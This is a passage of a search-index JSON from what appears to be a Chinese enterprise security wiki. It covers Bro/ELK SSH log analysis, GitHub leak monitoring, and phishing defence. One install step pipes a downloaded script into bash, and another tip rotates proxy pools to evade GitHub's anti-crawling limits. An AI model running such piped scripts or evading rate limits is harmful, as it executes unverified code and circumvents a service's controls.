Scripts"},{"location":"infrastructure-security/network-security/ids-ips/bro/#broelk","text":"ELK\u5b89\u88c5\u6587\u6863","title":"Bro+ELK\u5b9e\u73b0\u5165\u4fb5\u68c0\u6d4b\u65e5\u5fd7\u5206\u6790"},{"location":"infrastructure-security/network-security/ids-ips/bro/#ssh","text":"\u67e5\u770bBro\u4e2dSSH\u7684\u65e5\u5fd7\uff1a cat /usr/local/bro/logs/current/ssh.log \u7f16\u8f91logstash\u914d\u7f6e\u6587\u4ef6\uff1a wget https://raw.githubusercontent.com/fakrul/bro-elk/master/bro-ssh_log.conf # \u4fee\u6539\u65e5\u5fd7\u6587\u4ef6\u8def\u5f84 # \u4fee\u6539es\u5730\u5740\u4e0e\u7d22\u5f15\u540d\u79f0 # \u67e5\u770b\u6548\u679c","title":"\u5206\u6790SSH\u767b\u5f55\u65e5\u5fd7"},{"location":"infrastructure-security/network-security/ids-ips/bro/#_2","text":"\u4f7f\u7528Bro IDS\u548cIntel Critical Stack\u5206\u6790\u7f51\u7edc\u6d3b\u52a8","title":"\u53c2\u8003\u8d44\u6599"},{"location":"infrastructure-security/network-security/network-security-monitor/github-monitor/","text":"GitHub\u4fe1\u606f\u6cc4\u6f0f\u76d1\u63a7 \u4e3a\u4ec0\u4e48\u8981\u76d1\u63a7GitHub\uff0c\u56e0\u4e3a\u968f\u7740\u4f01\u4e1a\u53d1\u5c55\uff0c\u5404\u4e2a\u56e2\u961f\u4fe1\u606f\u5b89\u5168\u610f\u8bc6\u4e0d\u5230\u4f4d\uff0c\u53ef\u80fd\u5bfc\u81f4\u6d89\u53ca\u516c\u53f8\u7684\u654f\u611f\u4fe1\u606f\u88ab\u4e0a\u4f20\u5230GitHub\uff0c\u4e3b\u8981\u5305\u62ec\uff1a\u516c\u53f8\u4e1a\u52a1\u4ee3\u7801\u4fe1\u606f\u3001\u670d\u52a1\u5668\u8d26\u53f7\u5bc6\u7801\u6216\u79c1\u94a5\u4fe1\u606f\u3001\u5185\u90e8\u6838\u5fc3\u8d44\u6599\uff08\u5458\u5de5\u4fe1\u606f\u3001\u9879\u76ee\u6587\u6863\uff09\u7b49\u7b49\u3002 GitHub\u76d1\u63a7\u53ea\u662f\u4e00\u4e2a\u8f85\u52a9\u624b\u6bb5\uff0c\u4e0d\u8981\u8fc7\u5206\u4f9d\u8d56\u76d1\u63a7\u5e73\u53f0\uff0c\u56e0\u4e3aGitHub\u76d1\u63a7\u9700\u8981\u4eba\u5458\u53c2\u4e0e\u5904\u7406\uff0c\u6240\u4ee5\u4f1a\u5b58\u5728\u6f0f\u62a5\u7684\u60c5\u51b5\u3002 \u6211\u4eec\u9700\u8981\u505a\u5230\u4ece\u5236\u5ea6\u7ba1\u63a7\u5230\u5458\u5de5\u5b89\u5168\u610f\u8bc6\u57f9\u8bad\u7b49\u591a\u65b9\u9762\u6765\u63d0\u9ad8\u6574\u4f53\u5b89\u5168\u6c34\u5e73\u3002 \u76d1\u63a7\u6a21\u5f0f \u901a\u8fc7API\u8fdb\u884c\u76d1\u63a7 token\u6709\u67e5\u8be2\u9891\u6b21\u9650\u5236\u3002 API\u6587\u6863 \u901a\u8fc7\u722c\u866b\u8fdb\u884c\u76d1\u63a7 GitHub\u5b58\u5728\u53cd\u722c\u673a\u5236\uff0c\u9488\u5bf9\u9891\u6b21\u592a\u5feb\u7684IP\u4e0eUA\u7ef4\u5ea6\uff08\u8fd9\u4e2a\u662f\u5f88\u65e9\u4e4b\u524d\u6d4b\u8bd5\u53d1\u73b0\u7684\uff0c\u73b0\u5728\u7684\u7b56\u7565\u53ef\u80fd\u53d1\u751f\u4e86\u53d8\u5316\uff09\u3002 \u5e94\u5bf9\u53cd\u722c\u673a\u5236\uff1a \u964d\u4f4e\u8bf7\u6c42\u7684\u65f6\u95f4\u95f4\u9694\uff1a5s/\u8bf7\u6c42\u57fa\u672c\u5c31\u4e0d\u4f1a\u88ab\u62c9\u9ed1\uff1b \u4f7f\u7528IP\u4ee3\u7406\u6c60\uff0c\u9700\u8981\u8003\u8651\u4ee3\u7406\u6c60\u7684\u7a33\u5b9a\u6027\u4e0e\u4ee3\u7406\u6c60IP\u80fd\u5728\u88ab\u62c9\u9ed1\u540e\u5feb\u901f\u5207\u6362\uff1b GitHub\u76d1\u63a7\u89c4\u5219 \u5173\u952e\u5b57\u5339\u914d\u6a21\u5f0f \u7cbe\u51c6\u5339\u914d\uff1a\"keyword\"\uff0c\u4f7f\u7528\u53cc\u5f15\u53f7\u628a\u5173\u952e\u5b57\u5f15\u8d77\u6765\uff1b \u6a21\u7cca\u5339\u914d\uff1akeyword\uff0c\u5e38\u7528\u4e8e\u591a\u4e2a\u5173\u952e\u5b57\u8054\u5408\u641c\u7d22\uff0c\u5982\uff1adomain password; \u5907\u6ce8\uff1a\u6a21\u7cca\u5339\u914d\u7ecf\u5e38\u4f1a\u51fa\u73b0\u5339\u914d\u51fa\u6d77\u91cf\u7ed3\u679c\u7684\u60c5\u51b5\uff1b \u4f18\u5316\u5339\u914d\u89c4\u5219 \u662f\u5426\u5e94\u8be5\u9009\u62e9\u6392\u9664\u4e0d\u5c5e\u4e8e\u516c\u53f8\u7684\u5f00\u53d1\u8bed\u8a00\uff1a\u5426\uff0c\u7814\u53d1\u53ef\u80fd\u81ea\u5df1\u4f7f\u7528\u5176\u5b83\u8bed\u8a00\u7f16\u5199\u4ee3\u7801\uff1b \u6587\u4ef6\u540e\u7f00\u540d\u6392\u9664\uff1a\u6392\u9664gif\u3001png\u3001jpg\u7b49\u7c7b\u4f3c\u7684\u540e\u7f00\u540d\u6587\u4ef6\uff1b commit\u5185\u5bb9\u722c\u53d6\uff1a\u8c03\u7528API\u8fdb\u884c\u76d1\u63a7\u5c31\u53ef\u4ee5\u83b7\u53d6\u4fe1\u606f\uff1b \u52a0\u767d\u64cd\u4f5c \u52a0\u767d\u67d0\u4e2a\u7528\u6237\uff1a\u6bd4\u5982\u4e00\u4e9b\u767d\u5e3d\u5b50\u7684\u9879\u76ee\u4e2d\u4f1a\u6709\u5f88\u591a\u5173\u4e8e\u516c\u53f8\u7684\u5173\u952e\u5b57\uff0c\u53ef\u4ee5\u8003\u8651\u52a0\u767d\u8fd9\u4e2a\u4eba\uff1b \u52a0\u767d\u9879\u76ee\uff1a\u52a0\u767d\u9879\u76ee\u7684\u65f6\u5019\u9700\u8981\u8003\u8651\u5982\u679c\u9879\u76ee\u88abfork\u4ee5\u540e\uff0c\u6211\u4eec\u5982\u679c\u6807\u8bb0\u90a3\u4e9b\u88abfork\u7684\u9879\u76ee\uff1b \u524d\u7aef\u5c55\u793a \u6211\u601d\u8003\u7684\u6700\u4f18\u65b9\u6848\uff1a\u901a\u8fc7\u9879\u76ee\u6765\u5c55\u793a\uff0c\u4e00\u4e2a\u9879\u76ee\u4e2d\u6709\u591a\u5c11\u53ef\u7591\u7684URL\uff0c\u6bcf\u4e2aURL\u5c55\u793a\u547d\u4e2d\u5173\u952e\u5b57\u7684\u90e8\u5206\uff0c\u8fd9\u6837\u65b9\u4fbf\u8fd0\u8425\u4eba\u5458\u5728\u5904\u7406\u662f\u8fdb\u884c\u52a0\u767d\u3002 \u51e0\u4e2a\u601d\u8003 \u786e\u8ba4\u7684GitHub\u5e94\u8be5\u5982\u4f55\u5904\u7406 GitHub\u53ef\u4ee5\u8ffd\u6eaf\u5230\u4eba\uff0c\u76f4\u63a5\u8054\u7cfb\u5230\u4eba\u8fdb\u884c\u5220\u9664\uff1b \u4e0d\u80fd\u8ffd\u6eaf\u5230\u4eba\uff0cGitHub\u652f\u6301\u7ed9\u5b98\u7f51\u53d1\u9001\u90ae\u4ef6\uff0c\u8054\u7cfbGitHub\u8fdb\u884c\u5220\u9664\uff1b\u4f46\u662fGitHub\u4f1a\u516c\u5f00\u4ed6\u4eec\u5904\u7406\u7684\u7ed3\u679c\uff0c\u6240\u4ee5\u5982\u679c\u771f\u7684\u7531\u4e8e\u4e0d\u80fd\u8ffd\u6eaf\u5230\u4eba\u6cc4\u6f0f\uff0c\u8d76\u7d27\u60f3\u529e\u6cd5\u505a\u5176\u5b83\u5904\u7406\u5427\uff1b\u5982\uff1a\u6cc4\u6f0f\u4ee3\u7801\uff0c\u901a\u8fc7\u80fd\u63a5\u89e6\u5230\u8fd9\u4e9b\u4ee3\u7801\u7684\u4eba\u8fdb\u884c\u67e5\u8be2\uff1b\u6cc4\u6f0f\u7684\u662f\u8d26\u53f7\u5bc6\u7801\uff0c\u53ef\u4ee5\u53cd\u67e5\u80fd\u63a5\u89e6\u8d26\u53f7\u5bc6\u7801\u7684\u4eba\uff0c\u4e5f\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539\u5bc6\u7801\uff1b\uff08\u4e3b\u8981\u8fd8\u662f\u9700\u8981\u4ece\u5236\u5ea6\u4e0e\u5b89\u5168\u610f\u8bc6\u51fa\u53d1\uff09 GitHub\u94fe\u63a5 GitHub\u516c\u5e03\u5904\u7406\u7ed3\u679c \u5982\u4f55\u6784\u5efa\u5206\u5e03\u5f0f\u76d1\u63a7 \u79d1\u6280\u578b\u4f01\u4e1a\u652f\u6491\u96c6\u56e2\u5982\u4f55\u8003\u8651\u4e0d\u540c\u516c\u53f8\u7684\u7528\u6237\u6743\u9650\u63a7\u5236 \u5f00\u6e90GitHub\u76d1\u63a7 gsil \u7f8e\u8054\u5f00\u6e90 x-patrol \u5c0f\u7c73\u5f00\u6e90 Hawkeye Github-Monitor VIPKID SRC\u5f00\u6e90 \u5f00\u6e90\u4f18\u7f3a\u70b9\u5bf9\u6bd4 \u5f00\u6e90\u7684\u4ea7\u54c1\u90fd\u662f\u57fa\u4e8e\u4e24\u79cd\u76d1\u63a7\u6a21\u5f0f\u91cd\u590d\u9020\u7684\u8f6e\u5b50\uff0c\u6bcf\u4e2a\u4eba\u90fd\u6709\u81ea\u5df1\u7684\u4e60\u60ef\uff0c\u6240\u6709\u5bf9\u4e8e\u6bcf\u4e2a\u4eba\u4f18\u7f3a\u70b9\u90fd\u4e0d\u4e00\u6837\uff1b \u5bf9\u6bd4\u9879 gsil x-patrol GitHub-Monitr \u76d1\u63a7\u6a21\u5f0f API\u6a21\u5f0f API\u6a21\u5f0f API\u6a21\u5f0f \u5f00\u53d1\u8bed\u8a00 python go python docker\u652f\u6301 \u4e0d\u652f\u6301 \u4e0d\u652f\u6301 \u652f\u6301 Github-Monitor\u5b89\u88c5\u4e0e\u4f7f\u7528 # \u5b98\u65b9\u7684\u5b89\u88c5\u6587\u6863\u5df2\u7ecf\u5f88\u597d\u4e86\uff0c\u8865\u5145\u51e0\u4e2a\u70b9 # \u5b89\u88c5npm\u9700\u8981\u5b89\u88c5\u9ad8\u7248\u672c\u7684 wget -qO- https://rpm.nodesource.com/setup_10.x | bash yum install nodejs.x86_64 nodejs-npmlog.noarch -y # \u8fdb\u884cnpm\u5b89\u88c5\u7684\u65f6\u5019\u9700\u8981\u4f7f\u7528\u56fd\u5185\u7684\u6e90\uff0c\u5426\u5219\u5bb9\u6613\u62a5\u9519 npm config set registry https://registry.npm.taobao.org # \u8bbf\u95ee\u8bbf\u95ee\u524d\u7aef\u7aef\u53e3 \u62a5\u9519\u4fe1\u606f\u5982\u4e0b\uff1a npm ERR! code Z_BUF_ERROR npm ERR! errno -5 npm ERR! zlib: unexpected end of file npm ERR! A complete log of this run can be found in: npm ERR! /root/.npm/_logs/2019-01-15T04_46_18_284Z-debug.log","title":"GitHub\u4fe1\u606f\u6cc4\u6f0f\u76d1\u63a7"},{"location":"infrastructure-security/network-security/network-security-monitor/github-monitor/#github","text":"\u4e3a\u4ec0\u4e48\u8981\u76d1\u63a7GitHub\uff0c\u56e0\u4e3a\u968f\u7740\u4f01\u4e1a\u53d1\u5c55\uff0c\u5404\u4e2a\u56e2\u961f\u4fe1\u606f\u5b89\u5168\u610f\u8bc6\u4e0d\u5230\u4f4d\uff0c\u53ef\u80fd\u5bfc\u81f4\u6d89\u53ca\u516c\u53f8\u7684\u654f\u611f\u4fe1\u606f\u88ab\u4e0a\u4f20\u5230GitHub\uff0c\u4e3b\u8981\u5305\u62ec\uff1a\u516c\u53f8\u4e1a\u52a1\u4ee3\u7801\u4fe1\u606f\u3001\u670d\u52a1\u5668\u8d26\u53f7\u5bc6\u7801\u6216\u79c1\u94a5\u4fe1\u606f\u3001\u5185\u90e8\u6838\u5fc3\u8d44\u6599\uff08\u5458\u5de5\u4fe1\u606f\u3001\u9879\u76ee\u6587\u6863\uff09\u7b49\u7b49\u3002 GitHub\u76d1\u63a7\u53ea\u662f\u4e00\u4e2a\u8f85\u52a9\u624b\u6bb5\uff0c\u4e0d\u8981\u8fc7\u5206\u4f9d\u8d56\u76d1\u63a7\u5e73\u53f0\uff0c\u56e0\u4e3aGitHub\u76d1\u63a7\u9700\u8981\u4eba\u5458\u53c2\u4e0e\u5904\u7406\uff0c\u6240\u4ee5\u4f1a\u5b58\u5728\u6f0f\u62a5\u7684\u60c5\u51b5\u3002 \u6211\u4eec\u9700\u8981\u505a\u5230\u4ece\u5236\u5ea6\u7ba1\u63a7\u5230\u5458\u5de5\u5b89\u5168\u610f\u8bc6\u57f9\u8bad\u7b49\u591a\u65b9\u9762\u6765\u63d0\u9ad8\u6574\u4f53\u5b89\u5168\u6c34\u5e73\u3002","title":"GitHub\u4fe1\u606f\u6cc4\u6f0f\u76d1\u63a7"},{"location":"infrastructure-security/network-security/network-security-monitor/github-monitor/#_1","text":"","title":"\u76d1\u63a7\u6a21\u5f0f"},{"location":"infrastructure-security/network-security/network-security-monitor/github-monitor/#api","text":"token\u6709\u67e5\u8be2\u9891\u6b21\u9650\u5236\u3002 API\u6587\u6863","title":"\u901a\u8fc7API\u8fdb\u884c\u76d1\u63a7"},{"location":"infrastructure-security/network-security/network-security-monitor/github-monitor/#_2","text":"GitHub\u5b58\u5728\u53cd\u722c\u673a\u5236\uff0c\u9488\u5bf9\u9891\u6b21\u592a\u5feb\u7684IP\u4e0eUA\u7ef4\u5ea6\uff08\u8fd9\u4e2a\u662f\u5f88\u65e9\u4e4b\u524d\u6d4b\u8bd5\u53d1\u73b0\u7684\uff0c\u73b0\u5728\u7684\u7b56\u7565\u53ef\u80fd\u53d1\u751f\u4e86\u53d8\u5316\uff09\u3002 \u5e94\u5bf9\u53cd\u722c\u673a\u5236\uff1a \u964d\u4f4e\u8bf7\u6c42\u7684\u65f6\u95f4\u95f4\u9694\uff1a5s/\u8bf7\u6c42\u57fa\u672c\u5c31\u4e0d\u4f1a\u88ab\u62c9\u9ed1\uff1b \u4f7f\u7528IP\u4ee3\u7406\u6c60\uff0c\u9700\u8981\u8003\u8651\u4ee3\u7406\u6c60\u7684\u7a33\u5b9a\u6027\u4e0e\u4ee3\u7406\u6c60IP\u80fd\u5728\u88ab\u62c9\u9ed1\u540e\u5feb\u901f\u5207\u6362\uff1b","title":"\u901a\u8fc7\u722c\u866b\u8fdb\u884c\u76d1\u63a7"},{"location":"infrastructure-security/network-security/network-security-monitor/github-monitor/#github_1","text":"","title":"GitHub\u76d1\u63a7\u89c4\u5219"},{"location":"infrastructure-security/network-security/network-security-monitor/github-monitor/#_3","text":"\u7cbe\u51c6\u5339\u914d\uff1a\"keyword\"\uff0c\u4f7f\u7528\u53cc\u5f15\u53f7\u628a\u5173\u952e\u5b57\u5f15\u8d77\u6765\uff1b \u6a21\u7cca\u5339\u914d\uff1akeyword\uff0c\u5e38\u7528\u4e8e\u591a\u4e2a\u5173\u952e\u5b57\u8054\u5408\u641c\u7d22\uff0c\u5982\uff1adomain password; \u5907\u6ce8\uff1a\u6a21\u7cca\u5339\u914d\u7ecf\u5e38\u4f1a\u51fa\u73b0\u5339\u914d\u51fa\u6d77\u91cf\u7ed3\u679c\u7684\u60c5\u51b5\uff1b","title":"\u5173\u952e\u5b57\u5339\u914d\u6a21\u5f0f"},{"location":"infrastructure-security/network-security/network-security-monitor/github-monitor/#_4","text":"\u662f\u5426\u5e94\u8be5\u9009\u62e9\u6392\u9664\u4e0d\u5c5e\u4e8e\u516c\u53f8\u7684\u5f00\u53d1\u8bed\u8a00\uff1a\u5426\uff0c\u7814\u53d1\u53ef\u80fd\u81ea\u5df1\u4f7f\u7528\u5176\u5b83\u8bed\u8a00\u7f16\u5199\u4ee3\u7801\uff1b \u6587\u4ef6\u540e\u7f00\u540d\u6392\u9664\uff1a\u6392\u9664gif\u3001png\u3001jpg\u7b49\u7c7b\u4f3c\u7684\u540e\u7f00\u540d\u6587\u4ef6\uff1b commit\u5185\u5bb9\u722c\u53d6\uff1a\u8c03\u7528API\u8fdb\u884c\u76d1\u63a7\u5c31\u53ef\u4ee5\u83b7\u53d6\u4fe1\u606f\uff1b","title":"\u4f18\u5316\u5339\u914d\u89c4\u5219"},{"location":"infrastructure-security/network-security/network-security-monitor/github-monitor/#_5","text":"\u52a0\u767d\u67d0\u4e2a\u7528\u6237\uff1a\u6bd4\u5982\u4e00\u4e9b\u767d\u5e3d\u5b50\u7684\u9879\u76ee\u4e2d\u4f1a\u6709\u5f88\u591a\u5173\u4e8e\u516c\u53f8\u7684\u5173\u952e\u5b57\uff0c\u53ef\u4ee5\u8003\u8651\u52a0\u767d\u8fd9\u4e2a\u4eba\uff1b \u52a0\u767d\u9879\u76ee\uff1a\u52a0\u767d\u9879\u76ee\u7684\u65f6\u5019\u9700\u8981\u8003\u8651\u5982\u679c\u9879\u76ee\u88abfork\u4ee5\u540e\uff0c\u6211\u4eec\u5982\u679c\u6807\u8bb0\u90a3\u4e9b\u88abfork\u7684\u9879\u76ee\uff1b","title":"\u52a0\u767d\u64cd\u4f5c"},{"location":"infrastructure-security/network-security/network-security-monitor/github-monitor/#_6","text":"\u6211\u601d\u8003\u7684\u6700\u4f18\u65b9\u6848\uff1a\u901a\u8fc7\u9879\u76ee\u6765\u5c55\u793a\uff0c\u4e00\u4e2a\u9879\u76ee\u4e2d\u6709\u591a\u5c11\u53ef\u7591\u7684URL\uff0c\u6bcf\u4e2aURL\u5c55\u793a\u547d\u4e2d\u5173\u952e\u5b57\u7684\u90e8\u5206\uff0c\u8fd9\u6837\u65b9\u4fbf\u8fd0\u8425\u4eba\u5458\u5728\u5904\u7406\u662f\u8fdb\u884c\u52a0\u767d\u3002","title":"\u524d\u7aef\u5c55\u793a"},{"location":"infrastructure-security/network-security/network-security-monitor/github-monitor/#_7","text":"","title":"\u51e0\u4e2a\u601d\u8003"},{"location":"infrastructure-security/network-security/network-security-monitor/github-monitor/#github_2","text":"GitHub\u53ef\u4ee5\u8ffd\u6eaf\u5230\u4eba\uff0c\u76f4\u63a5\u8054\u7cfb\u5230\u4eba\u8fdb\u884c\u5220\u9664\uff1b \u4e0d\u80fd\u8ffd\u6eaf\u5230\u4eba\uff0cGitHub\u652f\u6301\u7ed9\u5b98\u7f51\u53d1\u9001\u90ae\u4ef6\uff0c\u8054\u7cfbGitHub\u8fdb\u884c\u5220\u9664\uff1b\u4f46\u662fGitHub\u4f1a\u516c\u5f00\u4ed6\u4eec\u5904\u7406\u7684\u7ed3\u679c\uff0c\u6240\u4ee5\u5982\u679c\u771f\u7684\u7531\u4e8e\u4e0d\u80fd\u8ffd\u6eaf\u5230\u4eba\u6cc4\u6f0f\uff0c\u8d76\u7d27\u60f3\u529e\u6cd5\u505a\u5176\u5b83\u5904\u7406\u5427\uff1b\u5982\uff1a\u6cc4\u6f0f\u4ee3\u7801\uff0c\u901a\u8fc7\u80fd\u63a5\u89e6\u5230\u8fd9\u4e9b\u4ee3\u7801\u7684\u4eba\u8fdb\u884c\u67e5\u8be2\uff1b\u6cc4\u6f0f\u7684\u662f\u8d26\u53f7\u5bc6\u7801\uff0c\u53ef\u4ee5\u53cd\u67e5\u80fd\u63a5\u89e6\u8d26\u53f7\u5bc6\u7801\u7684\u4eba\uff0c\u4e5f\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539\u5bc6\u7801\uff1b\uff08\u4e3b\u8981\u8fd8\u662f\u9700\u8981\u4ece\u5236\u5ea6\u4e0e\u5b89\u5168\u610f\u8bc6\u51fa\u53d1\uff09 GitHub\u94fe\u63a5 GitHub\u516c\u5e03\u5904\u7406\u7ed3\u679c","title":"\u786e\u8ba4\u7684GitHub\u5e94\u8be5\u5982\u4f55\u5904\u7406"},{"location":"infrastructure-security/network-security/network-security-monitor/github-monitor/#_8","text":"","title":"\u5982\u4f55\u6784\u5efa\u5206\u5e03\u5f0f\u76d1\u63a7"},{"location":"infrastructure-security/network-security/network-security-monitor/github-monitor/#_9","text":"","title":"\u79d1\u6280\u578b\u4f01\u4e1a\u652f\u6491\u96c6\u56e2\u5982\u4f55\u8003\u8651\u4e0d\u540c\u516c\u53f8\u7684\u7528\u6237\u6743\u9650\u63a7\u5236"},{"location":"infrastructure-security/network-security/network-security-monitor/github-monitor/#github_3","text":"gsil \u7f8e\u8054\u5f00\u6e90 x-patrol \u5c0f\u7c73\u5f00\u6e90 Hawkeye Github-Monitor VIPKID SRC\u5f00\u6e90","title":"\u5f00\u6e90GitHub\u76d1\u63a7"},{"location":"infrastructure-security/network-security/network-security-monitor/github-monitor/#_10","text":"\u5f00\u6e90\u7684\u4ea7\u54c1\u90fd\u662f\u57fa\u4e8e\u4e24\u79cd\u76d1\u63a7\u6a21\u5f0f\u91cd\u590d\u9020\u7684\u8f6e\u5b50\uff0c\u6bcf\u4e2a\u4eba\u90fd\u6709\u81ea\u5df1\u7684\u4e60\u60ef\uff0c\u6240\u6709\u5bf9\u4e8e\u6bcf\u4e2a\u4eba\u4f18\u7f3a\u70b9\u90fd\u4e0d\u4e00\u6837\uff1b \u5bf9\u6bd4\u9879 gsil x-patrol GitHub-Monitr \u76d1\u63a7\u6a21\u5f0f API\u6a21\u5f0f API\u6a21\u5f0f API\u6a21\u5f0f \u5f00\u53d1\u8bed\u8a00 python go python docker\u652f\u6301 \u4e0d\u652f\u6301 \u4e0d\u652f\u6301 \u652f\u6301","title":"\u5f00\u6e90\u4f18\u7f3a\u70b9\u5bf9\u6bd4"},{"location":"infrastructure-security/network-security/network-security-monitor/github-monitor/#github-monitor","text":"# \u5b98\u65b9\u7684\u5b89\u88c5\u6587\u6863\u5df2\u7ecf\u5f88\u597d\u4e86\uff0c\u8865\u5145\u51e0\u4e2a\u70b9 # \u5b89\u88c5npm\u9700\u8981\u5b89\u88c5\u9ad8\u7248\u672c\u7684 wget -qO- https://rpm.nodesource.com/setup_10.x | bash yum install nodejs.x86_64 nodejs-npmlog.noarch -y # \u8fdb\u884cnpm\u5b89\u88c5\u7684\u65f6\u5019\u9700\u8981\u4f7f\u7528\u56fd\u5185\u7684\u6e90\uff0c\u5426\u5219\u5bb9\u6613\u62a5\u9519 npm config set registry https://registry.npm.taobao.org # \u8bbf\u95ee\u8bbf\u95ee\u524d\u7aef\u7aef\u53e3 \u62a5\u9519\u4fe1\u606f\u5982\u4e0b\uff1a npm ERR! code Z_BUF_ERROR npm ERR! errno -5 npm ERR! zlib: unexpected end of file npm ERR! A complete log of this run can be found in: npm ERR! /root/.npm/_logs/2019-01-15T04_46_18_284Z-debug.log","title":"Github-Monitor\u5b89\u88c5\u4e0e\u4f7f\u7528"},{"location":"infrastructure-security/network-security/office-network-security/","text":"\u529e\u516c\u7f51\u7f51\u7edc\u5b89\u5168 \u53c2\u8003\u8d44\u6599 \u4f01\u4e1a\u5b89\u5168\u5efa\u8bbe\u4e4b\u6d45\u8c08\u529e\u516c\u7f51\u5b89\u5168","title":"\u529e\u516c\u7f51\u7f51\u7edc\u5b89\u5168"},{"location":"infrastructure-security/network-security/office-network-security/#_1","text":"","title":"\u529e\u516c\u7f51\u7f51\u7edc\u5b89\u5168"},{"location":"infrastructure-security/network-security/office-network-security/#_2","text":"\u4f01\u4e1a\u5b89\u5168\u5efa\u8bbe\u4e4b\u6d45\u8c08\u529e\u516c\u7f51\u5b89\u5168","title":"\u53c2\u8003\u8d44\u6599"},{"location":"infrastructure-security/network-security/office-network-security/email-security/","text":"\u90ae\u4ef6\u5b89\u5168 \u9493\u9c7c\u90ae\u4ef6 Phishing Email \u4f5c\u8005\uff1a \u5343\u57df\u5343\u5bfb \u7f51\u7edc\u9493\u9c7c\u4e8b\u4ef6\u5728\u7f51\u7edc\u4e16\u754c\u4e2d\u6bcf\u65f6\u6bcf\u523b\u90fd\u5728\u53d1\u751f\uff0c\u5404\u79cd\u6b3a\u8bc8\u624b\u6bb5\u82b1\u6837\u7ffb\u65b0\uff0c\u9632\u4e0d\u80dc\u9632\u3002\u800c\u8fd9\u5176\u4e2d\u6709\u4e00\u7c7b\u9493\u9c7c\u624b\u6bb5\u662f\u9ed1\u5ba2\u6700\u5e38\u7528\u7684\u90a3\u5c31\u662f\u90ae\u4ef6\u9493\u9c7c\u3002\u9493\u9c7c\u90ae\u4ef6\u901a\u5e38\u53ef\u4ee5\u5206\u4e09\u4e2a\u7c7b\u522b\uff1a \u94fe\u63a5\u9493\u9c7c\u90ae\u4ef6 \u3001 \u9644\u4ef6\u9493\u9c7c\u90ae\u4ef6 \u4ee5\u53ca \u90ae\u4ef6\u5934\u4f2a\u9020\u9493\u9c7c\u90ae\u4ef6 \uff08\u6216\u8005\u53eb\u4eff\u5192\u90ae\u4ef6\uff09\u3002 \u9493\u9c7c\u90ae\u4ef6\u7c7b\u578b \u90ae\u4ef6\u9493\u9c7c\u539f\u7406 \u94fe\u63a5\u9493\u9c7c \u9644\u4ef6\u9493\u9c7c \u90ae\u4ef6\u5934\u4f2a\u9020\u9493\u9c7c \u9493\u9c7c\u90ae\u4ef6\u9632\u5fa1\u5efa\u8bae \u9488\u5bf9\u7528\u6237 \u63d0\u9ad8\u4e2a\u4eba\u5b89\u5168\u610f\u8bc6\uff0c\u6536\u53d1\u90ae\u4ef6\u65f6\u786e\u8ba4\u6536\u53d1\u6765\u6e90\u662f\u5426\u53ef\u9760\uff0c\u4e0d\u8981\u968f\u610f\u70b9\u51fb\u6216\u8005\u590d\u5236\u90ae\u4ef6\u4e2d\u7684\u7f51\u5740\uff0c\u4e0d\u8981\u8f7b\u6613\u4e0b\u8f7d\u6765\u6e90\u4e0d\u660e\u7684\u9644\u4ef6\uff0c\u5efa\u8bae\u5bf9\u964c\u751f\u4eba\u90ae\u4ef6\u4e00\u5f8b\u4e0d\u6253\u5f00\u3002 \u5c3d\u91cf\u4e0d\u5728\u975e\u53ef\u63a7\u73af\u5883\u4e0b\u767b\u5f55\u7535\u5b50\u90ae\u4ef6\uff0c\u5982\u7f51\u5427\u7684\u7535\u8111\u3001\u5176\u4ed6\u4eba\u7684\u7535\u8111\u7b49\u3002 \u786e\u4fdd\u90ae\u4ef6\u6536\u53d1\u548c\u767b\u9646\u7ec8\u7aef\u7cfb\u7edf\u7684\u73af\u5883\u5b89\u5168\uff08PC\u3001\u624b\u673a\u3001PAD\u7b49\uff09\uff0c\u53ca\u65f6\u5347\u7ea7\u66f4\u65b0\u548c\u8fdb\u884c\u6f0f\u6d1e\u8865\u4e01\u4fee\u590d\uff0c\u5b89\u88c5\u7ec8\u7aef\u5b89\u5168\u9632\u62a4\u8f6f\u4ef6\u5e76\u53ca\u65f6\u5347\u7ea7\u6253\u5f00\u76d1\u63a7\uff0c\u786e\u4fdd\u90ae\u4ef6\u6536\u53d1\u7684\u73af\u5883\u5b89\u5168\u3002 \u90ae\u7bb1\u5bc6\u7801\u5fc5\u987b\u4f7f\u7528\u5f3a\u5bc6\u7801\uff08\u4f8b\u5982\uff1a\u5bc6\u7801\u957f\u5ea6\u5927\u4e8e12\u4f4d\u5b57\u7b26\uff0c\u4e14\u5fc5\u987b\u4e3a\u6570\u5b57\u3001\u82f1\u6587\u5927\u5c0f\u5199\u5b57\u6bcd\u3001\u7279\u6b8a\u5b57\u7b26\u7ec4\u5408\uff09\uff0c\u5e76\u5b9a\u671f\u66f4\u6362\u5bc6\u7801\uff1b\u5bc6\u7801\u4e0d\u5f97\u4e0e\u5176\u4ed6\u670d\u52a1\u6df7\u7528\u3002 \u5982\u4f7f\u7528\u90ae\u4ef6\u5ba2\u6237\u7aef\uff0c\u786e\u4fdd\u5ba2\u6237\u7aef\u5b89\u88c5\u7a0b\u5e8f\u7684\u5b89\u5168\u6027\uff0c\u6309\u7167\u90ae\u4ef6\u670d\u52a1\u5668\u652f\u6301\u7684\u52a0\u5bc6\u94fe\u63a5\u65b9\u5f0f\uff08\u5982SSL\uff09\u914d\u7f6e\u90ae\u4ef6\u6536\u53d1\uff0c\u800c\u4e0d\u8981\u4f7f\u7528\u660e\u6587\u534f\u8bae\u6536\u53d1\u90ae\u4ef6\uff1b\u5bf9\u90ae\u4ef6\u5ba2\u6237\u7aef\u6570\u636e\u6587\u4ef6\u6240\u5728\u5377\uff0c\u5efa\u8bae\u91c7\u7528\u5377\u52a0\u5bc6\uff08\u5982Bitlocker\uff09\u3002 \u6d4f\u89c8\u5668\u6536\u53d1\u90ae\u4ef6\u65f6\uff0c\u9700\u8981\u4f7f\u7528HTTPS\u534f\u8bae\u767b\u9646\u4fe1\u7bb1\uff0c\u800c\u4e0d\u8981\u4f7f\u7528HTTP\u767b\u9646\u3002\u4ee5\u9632\u88ab\u55c5\u63a2\u7a83\u53d6\u8d26\u6237\u5bc6\u7801\u3002 \u6309\u7167\u7ec4\u7ec7\u89c4\u5b9a\u89c4\u8303\u8fdb\u884c\u90ae\u4ef6\u7b7e\u540d\u3002 